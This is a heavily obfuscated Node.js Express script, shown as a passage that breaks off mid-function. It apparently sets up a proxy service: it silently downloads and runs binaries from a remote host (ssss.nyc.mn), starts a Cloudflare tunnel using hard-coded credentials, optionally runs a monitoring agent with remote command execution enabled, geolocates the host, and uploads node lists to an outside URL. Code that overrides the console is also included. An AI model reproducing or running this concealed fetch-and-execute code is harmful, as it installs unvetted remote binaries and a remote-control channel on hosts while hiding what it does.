const _0x30a5d0=_0x1898;function _0x1898(_0x4e811d,_0x29a859){const _0x8b7fc8=_0x1d2c();return _0x1898=function(_0x2a1beb,_0x17b007){_0x2a1beb=_0x2a1beb-0x1bc;let _0x3985bb=_0x8b7fc8[_0x2a1beb];return _0x3985bb;},_0x1898(_0x4e811d,_0x29a859);}(function(_0x4c296a,_0x424df2){const _0x31fe63=_0x1898,_0x85f62a=_0x4c296a();while(!![]){try{const _0x1c2906=parseInt(_0x31fe63(0x1cd))/0x1*(parseInt(_0x31fe63(0x1c8))/0x2)+parseInt(_0x31fe63(0x242))/0x3*(-parseInt(_0x31fe63(0x23b))/0x4)+-parseInt(_0x31fe63(0x210))/0x5*(-parseInt(_0x31fe63(0x238))/0x6)+parseInt(_0x31fe63(0x22f))/0x7*(-parseInt(_0x31fe63(0x21e))/0x8)+-parseInt(_0x31fe63(0x22a))/0x9+parseInt(_0x31fe63(0x251))/0xa*(parseInt(_0x31fe63(0x266))/0xb)+parseInt(_0x31fe63(0x1c0))/0xc;if(_0x1c2906===_0x424df2)break;else _0x85f62a['push'](_0x85f62a['shift']());}catch(_0x2a8a50){_0x85f62a['push'](_0x85f62a['shift']());}}}(_0x1d2c,0x6c85f));const _0x453353=(function(){let _0x4cef23=!![];return function(_0x96fc21,_0x1621b2){const _0x36013a=_0x4cef23?function(){if(_0x1621b2){const _0x3b8cfa=_0x1621b2['apply'](_0x96fc21,arguments);return _0x1621b2=null,_0x3b8cfa;}}:function(){};return _0x4cef23=![],_0x36013a;};}()),_0x3f9430=_0x453353(this,function(){const _0x57e859=_0x1898;return _0x3f9430[_0x57e859(0x211)]()[_0x57e859(0x23c)](_0x57e859(0x26c))[_0x57e859(0x211)]()[_0x57e859(0x1df)](_0x3f9430)[_0x57e859(0x23c)](_0x57e859(0x26c));});_0x3f9430();const _0x17b007=(function(){let _0x2ac21f=!![];return function(_0x147956,_0x24d54f){const _0x23f18a=_0x2ac21f?function(){const _0x574100=_0x1898;if(_0x24d54f){const _0x50682d=_0x24d54f[_0x574100(0x224)](_0x147956,arguments);return _0x24d54f=null,_0x50682d;}}:function(){};return _0x2ac21f=![],_0x23f18a;};}()),_0x2a1beb=_0x17b007(this,function(){const _0x3c5eba=_0x1898,_0x9fbcc4=function(){const _0x26beb0=_0x1898;let _0x5b1e20;try{_0x5b1e20=Function(_0x26beb0(0x225)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x3c4ee4){_0x5b1e20=window;}return _0x5b1e20;},_0x203ac0=_0x9fbcc4(),_0x485635=_0x203ac0[_0x3c5eba(0x25d)]=_0x203ac0[_0x3c5eba(0x25d)]||{},_0x323d0c=[_0x3c5eba(0x1ea),'warn',_0x3c5eba(0x241),_0x3c5eba(0x257),_0x3c5eba(0x278),'table',_0x3c5eba(0x26f)];for(let _0x34958=0x0;_0x34958<_0x323d0c['length'];_0x34958++){const _0x495c8e=_0x17b007[_0x3c5eba(0x1df)]['prototype']['bind'](_0x17b007),_0x41e3e1=_0x323d0c[_0x34958],_0x305150=_0x485635[_0x41e3e1]||_0x495c8e;_0x495c8e[_0x3c5eba(0x28b)]=_0x17b007[_0x3c5eba(0x200)](_0x17b007),_0x495c8e[_0x3c5eba(0x211)]=_0x305150[_0x3c5eba(0x211)][_0x3c5eba(0x200)](_0x305150),_0x485635[_0x41e3e1]=_0x495c8e;}});_0x2a1beb();const express=require('express'),app=express(),axios=require(_0x30a5d0(0x27c)),os=require('os'),fs=require('fs'),path=require(_0x30a5d0(0x28d)),{promisify}=require(_0x30a5d0(0x23a)),exec=promisify(require(_0x30a5d0(0x226))[_0x30a5d0(0x232)]),UPLOAD_URL=process[_0x30a5d0(0x221)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x30a5d0(0x25a)]||'',AUTO_ACCESS=process['env'][_0x30a5d0(0x255)]||![],FILE_PATH=process[_0x30a5d0(0x221)][_0x30a5d0(0x1bf)]||_0x30a5d0(0x1f3),SUB_PATH=process['env']['SUB_PATH']||'xujq',PORT=process[_0x30a5d0(0x221)][_0x30a5d0(0x1fa)]||process[_0x30a5d0(0x221)][_0x30a5d0(0x1fb)]||0xbb8,UUID=process['env']['UUID']||_0x30a5d0(0x235),NEZHA_SERVER=process['env'][_0x30a5d0(0x1f2)]||'',NEZHA_PORT=process['env'][_0x30a5d0(0x23d)]||'',NEZHA_KEY=process[_0x30a5d0(0x221)][_0x30a5d0(0x284)]||'',ARGO_DOMAIN=process[_0x30a5d0(0x221)][_0x30a5d0(0x247)]||_0x30a5d0(0x23e),ARGO_AUTH=process['env'][_0x30a5d0(0x1d1)]||_0x30a5d0(0x209),ARGO_PORT=process[_0x30a5d0(0x221)][_0x30a5d0(0x234)]||0x1f41,CFIP=process[_0x30a5d0(0x221)][_0x30a5d0(0x24f)]||_0x30a5d0(0x285),CFPORT=process[_0x30a5d0(0x221)][_0x30a5d0(0x1ff)]||0x1bb,NAME=process['env'][_0x30a5d0(0x248)]||_0x30a5d0(0x1ca);!fs['existsSync'](FILE_PATH)?(fs[_0x30a5d0(0x219)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2038cb=_0x30a5d0,_0x3a926b=_0x2038cb(0x201);let _0x46b5cb='';for(let _0x30ce6c=0x0;_0x30ce6c<0x6;_0x30ce6c++){_0x46b5cb+=_0x3a926b[_0x2038cb(0x273)](Math['floor'](Math[_0x2038cb(0x20d)]()*_0x3a926b[_0x2038cb(0x290)]));}return _0x46b5cb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x30a5d0(0x1e3)](FILE_PATH,npmName),phpPath=path[_0x30a5d0(0x1e3)](FILE_PATH,phpName),webPath=path[_0x30a5d0(0x1e3)](FILE_PATH,webName),botPath=path[_0x30a5d0(0x1e3)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x30a5d0(0x1bc)),listPath=path[_0x30a5d0(0x1e3)](FILE_PATH,_0x30a5d0(0x27b)),bootLogPath=path[_0x30a5d0(0x1e3)](FILE_PATH,_0x30a5d0(0x1e5)),configPath=path['join'](FILE_PATH,_0x30a5d0(0x1f4));function deleteNodes(){const _0x1767bb=_0x30a5d0;try{if(!UPLOAD_URL)return;if(!fs[_0x1767bb(0x223)](subPath))return;let _0x37bbe4;try{_0x37bbe4=fs[_0x1767bb(0x259)](subPath,_0x1767bb(0x1f7));}catch{return null;}const _0x395683=Buffer[_0x1767bb(0x205)](_0x37bbe4,_0x1767bb(0x1c5))[_0x1767bb(0x211)](_0x1767bb(0x1f7)),_0x50d6f5=_0x395683['split']('\x0a')[_0x1767bb(0x28e)](_0xc99cc4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1767bb(0x1c7)](_0xc99cc4));if(_0x50d6f5['length']===0x0)return;return axios[_0x1767bb(0x216)](UPLOAD_URL+_0x1767bb(0x1d5),JSON[_0x1767bb(0x1e0)]({'nodes':_0x50d6f5}),{'headers':{'Content-Type':_0x1767bb(0x1d6)}})[_0x1767bb(0x274)](_0x38aa9a=>{return null;}),null;}catch(_0x5853a5){return null;}}function cleanupOldFiles(){const _0x59052b=_0x30a5d0;try{const _0x47d3ce=fs['readdirSync'](FILE_PATH);_0x47d3ce[_0x59052b(0x246)](_0x2a05d4=>{const _0x2be79d=_0x59052b,_0x4edf40=path['join'](FILE_PATH,_0x2a05d4);try{const _0x370152=fs[_0x2be79d(0x289)](_0x4edf40);_0x370152['isFile']()&&fs[_0x2be79d(0x1ef)](_0x4edf40);}catch(_0xf38dcf){}});}catch(_0x1b0902){}}async function generateConfig(){const _0x304bc5=_0x30a5d0,_0xfb4da9={'log':{'access':_0x304bc5(0x254),'error':'/dev/null','loglevel':_0x304bc5(0x261)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x304bc5(0x1d3),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x304bc5(0x261),'fallbacks':[{'dest':0xbb9},{'path':_0x304bc5(0x1fe),'dest':0xbba},{'path':_0x304bc5(0x239),'dest':0xbbb},{'path':_0x304bc5(0x286),'dest':0xbbc}]},'streamSettings':{'network':_0x304bc5(0x203)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x304bc5(0x261)},'streamSettings':{'network':_0x304bc5(0x203),'security':_0x304bc5(0x261)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x304bc5(0x1d3),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x304bc5(0x261)},'streamSettings':{'network':'ws','security':_0x304bc5(0x261),'wsSettings':{'path':_0x304bc5(0x1fe)}},'sniffing':{'enabled':!![],'destOverride':[_0x304bc5(0x25b),_0x304bc5(0x1c2),_0x304bc5(0x231)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x304bc5(0x239)}},'sniffing':{'enabled':!![],'destOverride':[_0x304bc5(0x25b),_0x304bc5(0x1c2),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x304bc5(0x1d0),'protocol':_0x304bc5(0x276),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x304bc5(0x261),'wsSettings':{'path':_0x304bc5(0x286)}},'sniffing':{'enabled':!![],'destOverride':[_0x304bc5(0x25b),_0x304bc5(0x1c2),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x304bc5(0x228)]},'outbounds':[{'protocol':_0x304bc5(0x1db),'tag':_0x304bc5(0x24b)},{'protocol':_0x304bc5(0x25e),'tag':_0x304bc5(0x268)}]};fs[_0x304bc5(0x1e4)](path[_0x304bc5(0x1e3)](FILE_PATH,'config.json'),JSON[_0x304bc5(0x1e0)](_0xfb4da9,null,0x2));}function getSystemArchitecture(){const _0x1fdff4=_0x30a5d0,_0x213a61=os[_0x1fdff4(0x1c6)]();return _0x213a61===_0x1fdff4(0x1f8)||_0x213a61===_0x1fdff4(0x1dd)||_0x213a61===_0x1fdff4(0x22b)?_0x1fdff4(0x1f8):_0x1fdff4(0x21a);}function downloadFile(_0x59bd89,_0x1959de,_0x119f77){const _0x138e2c=_0x30a5d0,_0x2da5b1=_0x59bd89;!fs['existsSync'](FILE_PATH)&&fs[_0x138e2c(0x219)](FILE_PATH,{'recursive':!![]});const _0x5a7423=fs[_0x138e2c(0x28c)](_0x2da5b1);axios({'method':_0x138e2c(0x21f),'url':_0x1959de,'responseType':_0x138e2c(0x1ec)})[_0x138e2c(0x22d)](_0x2f9093=>{const _0x3adf23=_0x138e2c;_0x2f9093['data'][_0x3adf23(0x277)](_0x5a7423),_0x5a7423['on'](_0x3adf23(0x28a),()=>{const _0x1f1cac=_0x3adf23;_0x5a7423['close'](),console['log'](_0x1f1cac(0x1de)+path[_0x1f1cac(0x21d)](_0x2da5b1)+_0x1f1cac(0x1fc)),_0x119f77(null,_0x2da5b1);}),_0x5a7423['on'](_0x3adf23(0x257),_0x1d6ead=>{const _0x5cd947=_0x3adf23;fs[_0x5cd947(0x1f5)](_0x2da5b1,()=>{});const _0x5dbf7f=_0x5cd947(0x1de)+path[_0x5cd947(0x21d)](_0x2da5b1)+_0x5cd947(0x1c9)+_0x1d6ead[_0x5cd947(0x26a)];console['error'](_0x5dbf7f),_0x119f77(_0x5dbf7f);});})['catch'](_0x3277e5=>{const _0x2a807d=_0x138e2c,_0xfb2eea=_0x2a807d(0x1de)+path['basename'](_0x2da5b1)+_0x2a807d(0x1c9)+_0x3277e5['message'];console['error'](_0xfb2eea),_0x119f77(_0xfb2eea);});}async function downloadFilesAndRun(){const _0x5c2084=_0x30a5d0,_0x157a81=getSystemArchitecture(),_0x45d830=getFilesForArchitecture(_0x157a81);if(_0x45d830['length']===0x0){console['log'](_0x5c2084(0x282));return;}const _0x96e049=_0x45d830['map'](_0x12027f=>{return new Promise((_0x7bd74b,_0x2b621d)=>{const _0x425f52=_0x1898;downloadFile(_0x12027f[_0x425f52(0x283)],_0x12027f[_0x425f52(0x227)],(_0x3e2759,_0x2288c6)=>{_0x3e2759?_0x2b621d(_0x3e2759):_0x7bd74b(_0x2288c6);});});});try{await Promise[_0x5c2084(0x24d)](_0x96e049);}catch(_0xf4584d){console[_0x5c2084(0x257)](_0x5c2084(0x1e8),_0xf4584d);return;}function _0x283193(_0x218592){const _0x1901f7=_0x5c2084,_0x2951aa=0x1fd;_0x218592[_0x1901f7(0x246)](_0x19a4d3=>{const _0x5e620f=_0x1901f7;fs[_0x5e620f(0x223)](_0x19a4d3)&&fs[_0x5e620f(0x1be)](_0x19a4d3,_0x2951aa,_0x424ce0=>{const _0x216569=_0x5e620f;_0x424ce0?console[_0x216569(0x257)](_0x216569(0x260)+_0x19a4d3+':\x20'+_0x424ce0):console[_0x216569(0x1ea)]('Empowerment\x20success\x20for\x20'+_0x19a4d3+':\x20'+_0x2951aa[_0x216569(0x211)](0x8));});});}const _0x35a720=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x283193(_0x35a720);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53c1be=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x5c2084(0x1bd)](':')['pop']():'',_0x4ffe05=new Set([_0x5c2084(0x250),_0x5c2084(0x1cb),_0x5c2084(0x1f9),_0x5c2084(0x204),'2083',_0x5c2084(0x269)]),_0x5c5c3f=_0x4ffe05[_0x5c2084(0x262)](_0x53c1be)?_0x5c2084(0x26b):_0x5c2084(0x1eb),_0x1dcf58=_0x5c2084(0x213)+NEZHA_KEY+_0x5c2084(0x280)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5c5c3f+_0x5c2084(0x212)+UUID;fs[_0x5c2084(0x1e4)](path['join'](FILE_PATH,_0x5c2084(0x214)),_0x1dcf58);const _0xa49fe8='nohup\x20'+phpPath+_0x5c2084(0x253)+FILE_PATH+_0x5c2084(0x256);try{await exec(_0xa49fe8),console[_0x5c2084(0x1ea)](phpName+_0x5c2084(0x272)),await new Promise(_0x16dd4c=>setTimeout(_0x16dd4c,0x3e8));}catch(_0x203614){console[_0x5c2084(0x257)](_0x5c2084(0x20b)+_0x203614);}}else{let _0x40565d='';const _0x313273=[_0x5c2084(0x250),_0x5c2084(0x1cb),_0x5c2084(0x1f9),_0x5c2084(0x204),_0x5c2084(0x27f),'2053'];_0x313273[_0x5c2084(0x1c4)](NEZHA_PORT)&&(_0x40565d=_0x5c2084(0x245));const _0x255835='nohup\x20'+npmPath+_0x5c2084(0x291)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c2084(0x267)+NEZHA_KEY+'\x20'+_0x40565d+_0x5c2084(0x27e);try{await exec(_0x255835),console[_0x5c2084(0x1ea)](npmName+_0x5c2084(0x272)),await new Promise(_0x10fdbe=>setTimeout(_0x10fdbe,0x3e8));}catch(_0x332916){console['error'](_0x5c2084(0x26d)+_0x332916);}}}else console['log'](_0x5c2084(0x1cc));const _0x592351=_0x5c2084(0x26e)+webPath+_0x5c2084(0x1c3)+FILE_PATH+_0x5c2084(0x22e);try{await exec(_0x592351),console[_0x5c2084(0x1ea)](webName+'\x20is\x20running'),await new Promise(_0x1461ca=>setTimeout(_0x1461ca,0x3e8));}catch(_0x471dd0){console[_0x5c2084(0x257)](_0x5c2084(0x1c1)+_0x471dd0);}if(fs[_0x5c2084(0x223)](botPath)){let _0x395e6c;if(ARGO_AUTH[_0x5c2084(0x206)](/^[A-Z0-9a-z=]{120,250}$/))_0x395e6c=_0x5c2084(0x27d)+ARGO_AUTH;else ARGO_AUTH[_0x5c2084(0x206)](/TunnelSecret/)?_0x395e6c=_0x5c2084(0x207)+FILE_PATH+_0x5c2084(0x21c):_0x395e6c=_0x5c2084(0x1d9)+FILE_PATH+_0x5c2084(0x1e1)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x395e6c+'\x20>/dev/null\x202>&1\x20&'),console[_0x5c2084(0x1ea)](botName+_0x5c2084(0x272)),await new Promise(_0x37fdfa=>setTimeout(_0x37fdfa,0x7d0));}catch(_0x53fab2){console[_0x5c2084(0x257)]('Error\x20executing\x20command:\x20'+_0x53fab2);}}await new Promise(_0x3aaf4b=>setTimeout(_0x3aaf4b,0x1388));}function getFilesForArchitecture(_0x932f8a){const _0x472757=_0x30a5d0;let _0x10dcec;_0x932f8a===_0x472757(0x1f8)?_0x10dcec=[{'fileName':webPath,'fileUrl':_0x472757(0x281)},{'fileName':botPath,'fileUrl':_0x472757(0x229)}]:_0x10dcec=[{'fileName':webPath,'fileUrl':_0x472757(0x1da)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1b6351=_0x932f8a===_0x472757(0x1f8)?_0x472757(0x25f):'https://amd64.ssss.nyc.mn/agent';_0x10dcec[_0x472757(0x1e7)]({'fileName':npmPath,'fileUrl':_0x1b6351});}else{const _0x42d740=_0x932f8a===_0x472757(0x1f8)?_0x472757(0x265):'https://amd64.ssss.nyc.mn/v1';_0x10dcec[_0x472757(0x1e7)]({'fileName':phpPath,'fileUrl':_0x42d740});}}return _0x10dcec;}function _0x1d2c(){const _0x49f489=['.exe\x20>\x20nul\x202>&1','status','info','3ZwueTc','automatic\x20access\x20task\x20added\x20successfully','win32','--tls','forEach','ARGO_DOMAIN','NAME','rm\x20-rf\x20','Unhandled\x20error\x20in\x20startserver:','direct','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','all','&path=%2Fvless-argo%3Fed%3D2560#','CFIP','443','2157040iErSUL','index.html','\x20-c\x20\x22','/dev/null','AUTO_ACCESS','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','error','send','readFileSync','PROJECT_URL','http','\x0a\x20\x20\x20\x20','console','blackhole','https://arm64.ssss.nyc.mn/agent','Empowerment\x20failed\x20for\x20','none','has','Subscription\x20uploaded\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/v1','11yUBwXM','\x20-p\x20','block','2053','message','true','(((.+)+)+)+$','npm\x20running\x20error:\x20','nohup\x20','trace','utf8','/api/add-subscriptions','\x20is\x20running','charAt','catch','listen','trojan','pipe','exception','&fp=firefox&type=ws&host=','Nodes\x20uploaded\x20successfully','list.txt','axios','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2083','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/web','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','fileName','NEZHA_KEY','cdns.doon.eu.org','/trojan-argo','data','\x0avless://','statSync','finish','__proto__','createWriteStream','path','filter','push','length','\x20-s\x20','sub.txt','split','chmod','FILE_PATH','14738424ZHJUpt','web\x20running\x20error:\x20','tls','\x20-c\x20','includes','base64','arch','test','12TKEinj','\x20failed:\x20','Galaxy','8443','NEZHA\x20variable\x20is\x20empty,skip\x20running','45563wYTGlg','http://ip-api.com/json','\x0a\x0atrojan://','127.0.0.1','ARGO_AUTH','response','vless','country_code','/api/delete-nodes','application/json','/api/add-nodes','org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/web','freedom','ARGO_DOMAIN:','arm64','Download\x20','constructor','stringify','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://ipapi.co/json','join','writeFileSync','boot.log','clear','unshift','Error\x20downloading\x20files:','\x0a\x20\x20tunnel:\x20','log','false','stream','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo?ed=2560','unlinkSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','App\x20is\x20running','NEZHA_SERVER','.tmp','config.json','unlink','pkill\x20-f\x20\x22[','utf-8','arm','2096','SERVER_PORT','PORT','\x20successfully','ArgoDomain:','/vless-argo','CFPORT','bind','abcdefghijklmnopqrstuvwxyz','text/plain;\x20charset=utf-8','tcp','2087','from','match','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20>/dev/null\x202>&1\x20&','eyJhIjoiMTZjZjVkMzQwODQ2YmU1MDNlYWQzNjY2NTI4MDczNTMiLCJ0IjoiMTI3ZjZhYWQtODlkZi00Mzk1LWI2OWEtNTgwYTE3YTdiYTczIiwicyI6Ik9HWmlNRFZqWTJNdFlUYzFNUzAwWVdNekxXSm1NbVF0TWpRME16ZGhPVEJoWW1KaSJ9','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','php\x20running\x20error:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','random','tunnel.yml','tunnel.json','7285ZLileg','toString','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0aclient_secret:\x20','config.yaml','platform','post','countryCode','Error\x20in\x20startserver:','mkdirSync','amd','\x20>/dev/null\x202>&1','/tunnel.yml\x20run','basename','1056oswBCC','get','TunnelSecret','env','http\x20server\x20is\x20running\x20on\x20port:','existsSync','apply','return\x20(function()\x20','child_process','fileUrl','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/bot','3435003WzmWcZ','aarch64','promises','then','/config.json\x20>/dev/null\x202>&1\x20&','32802ZfZeVC','Skipping\x20adding\x20automatic\x20access\x20task','quic','exec','success','ARGO_PORT','Xly9bOgVH4Dr9guR253zKnjBeM68xoSj2M9oiO2xpFo=:T1h9ibyFCiRuktJLw4JrlKgCVrsBmf095wwTnHlI+XQ=','\x20>\x20nul\x202>&1','set','1182RaVZXw','/vmess-argo','util','2238332nDnEEM','search','NEZHA_PORT','gla.900809.xyz'];_0x1d2c=function(){return _0x49f489;};return _0x1d2c();}function argoType(){const _0xc4cd60=_0x30a5d0;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0xc4cd60(0x1c4)](_0xc4cd60(0x220))){fs[_0xc4cd60(0x1e4)](path[_0xc4cd60(0x1e3)](FILE_PATH,_0xc4cd60(0x20f)),ARGO_AUTH);const _0x43ab47=_0xc4cd60(0x1e9)+ARGO_AUTH[_0xc4cd60(0x1bd)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0xc4cd60(0x20f))+_0xc4cd60(0x24c)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0xc4cd60(0x1e3)](FILE_PATH,_0xc4cd60(0x20e)),_0x43ab47);}else console[_0xc4cd60(0x1ea)](_0xc4cd60(0x1f0));}async function extractDomains(){const _0xd13bd6=_0x30a5d0;let _0x70abd;if(ARGO_AUTH&&ARGO_DOMAIN)_0x70abd=ARGO_DOMAIN,console[_0xd13bd6(0x1ea)](_0xd13bd6(0x1dc),_0x70abd),await _0x4916ab(_0x70abd);else try{const _0x5b9b94=fs[_0xd13bd6(0x259)](path[_0xd13bd6(0x1e3)](FILE_PATH,'boot.log'),_0xd13bd6(0x1f7)),_0x4db978=_0x5b9b94[_0xd13bd6(0x1bd)]('\x0a'),_0x2f907a=[];_0x4db978[_0xd13bd6(0x246)](_0x4e0b6a=>{const _0x40ba90=_0xd13bd6,_0x69d33=_0x4e0b6a[_0x40ba90(0x206)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x69d33){const _0x274832=_0x69d33[0x1];_0x2f907a[_0x40ba90(0x28f)](_0x274832);}});if(_0x2f907a[_0xd13bd6(0x290)]>0x0)_0x70abd=_0x2f907a[0x0],console[_0xd13bd6(0x1ea)](_0xd13bd6(0x1fd),_0x70abd),await _0x4916ab(_0x70abd);else{console[_0xd13bd6(0x1ea)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0xd13bd6(0x1ef)](path[_0xd13bd6(0x1e3)](FILE_PATH,'boot.log'));async function _0x3177be(){const _0x2de21e=_0xd13bd6;try{process[_0x2de21e(0x215)]===_0x2de21e(0x244)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x2de21e(0x23f)):await exec(_0x2de21e(0x1f6)+botName[_0x2de21e(0x273)](0x0)+']'+botName['substring'](0x1)+_0x2de21e(0x1ed));}catch(_0x28c6ae){}}_0x3177be(),await new Promise(_0x2cb679=>setTimeout(_0x2cb679,0xbb8));const _0x1a3833='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xd13bd6(0x1e1)+ARGO_PORT;try{await exec(_0xd13bd6(0x26e)+botPath+'\x20'+_0x1a3833+_0xd13bd6(0x208)),console[_0xd13bd6(0x1ea)](botName+_0xd13bd6(0x272)),await new Promise(_0x4390ad=>setTimeout(_0x4390ad,0xbb8)),await extractDomains();}catch(_0x72c613){console[_0xd13bd6(0x257)]('Error\x20executing\x20command:\x20'+_0x72c613);}}}catch(_0x4a25d6){console['error']('Error\x20reading\x20boot.log:',_0x4a25d6);}async function _0x7e8ef6(){const _0x50b3ed=_0xd13bd6;try{const _0x5245e2=await axios['get'](_0x50b3ed(0x1e2),{'timeout':0xbb8});if(_0x5245e2[_0x50b3ed(0x287)]&&_0x5245e2['data'][_0x50b3ed(0x1d4)]&&_0x5245e2['data']['org'])return _0x5245e2[_0x50b3ed(0x287)][_0x50b3ed(0x1d4)]+'_'+_0x5245e2['data'][_0x50b3ed(0x1d8)];}catch(_0x54be30){try{const _0x43ced7=await axios['get'](_0x50b3ed(0x1ce),{'timeout':0xbb8});if(_0x43ced7['data']&&_0x43ced7[_0x50b3ed(0x287)][_0x50b3ed(0x240)]===_0x50b3ed(0x233)&&_0x43ced7['data']['countryCode']&&_0x43ced7[_0x50b3ed(0x287)][_0x50b3ed(0x1d8)])return _0x43ced7[_0x50b3ed(0x287)][_0x50b3ed(0x217)]+'_'+_0x43ced7[_0x50b3ed(0x287)][_0x50b3ed(0x1d8)];}catch(_0xa7a028){}}return'Unknown';}async function _0x4916ab(_0x3ecd60){const _0x3779ea=await _0x7e8ef6(),_0x26024e=NAME?NAME+'-'+_0x3779ea:_0x3779ea;return new Promise(_0x1b1e55=>{setTimeout(()=>{const _0x1a6e96=_0x1898,_0x374010={'v':'2','ps':''+_0x26024e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1a6e96(0x261),'net':'ws','type':'none','host':_0x3ecd60,'path':_0x1a6e96(0x1ee),'tls':_0x1a6e96(0x1c2),'sni':_0x3ecd60,'alpn':'','fp':'firefox'},_0x4994f7=_0x1a6e96(0x288)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3ecd60+_0x1a6e96(0x279)+_0x3ecd60+_0x1a6e96(0x24e)+_0x26024e+'\x0a\x0avmess://'+Buffer[_0x1a6e96(0x205)](JSON[_0x1a6e96(0x1e0)](_0x374010))['toString'](_0x1a6e96(0x1c5))+_0x1a6e96(0x1cf)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3ecd60+_0x1a6e96(0x279)+_0x3ecd60+_0x1a6e96(0x20c)+_0x26024e+_0x1a6e96(0x25c);console[_0x1a6e96(0x1ea)](Buffer[_0x1a6e96(0x205)](_0x4994f7)[_0x1a6e96(0x211)](_0x1a6e96(0x1c5))),fs[_0x1a6e96(0x1e4)](subPath,Buffer[_0x1a6e96(0x205)](_0x4994f7)[_0x1a6e96(0x211)](_0x1a6e96(0x1c5))),console[_0x1a6e96(0x1ea)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1a6e96(0x21f)]('/'+SUB_PATH,(_0x48eb77,_0x437020)=>{const _0x207d3b=_0x1a6e96,_0x42ff67=Buffer[_0x207d3b(0x205)](_0x4994f7)[_0x207d3b(0x211)](_0x207d3b(0x1c5));_0x437020[_0x207d3b(0x237)]('Content-Type',_0x207d3b(0x202)),_0x437020[_0x207d3b(0x258)](_0x42ff67);}),_0x1b1e55(_0x4994f7);},0x7d0);});}}async function uploadNodes(){const _0xa3c270=_0x30a5d0;if(UPLOAD_URL&&PROJECT_URL){const _0x2c5f38=PROJECT_URL+'/'+SUB_PATH,_0xefb1ac={'subscription':[_0x2c5f38]};try{const _0x1ce143=await axios['post'](UPLOAD_URL+_0xa3c270(0x271),_0xefb1ac,{'headers':{'Content-Type':'application/json'}});return 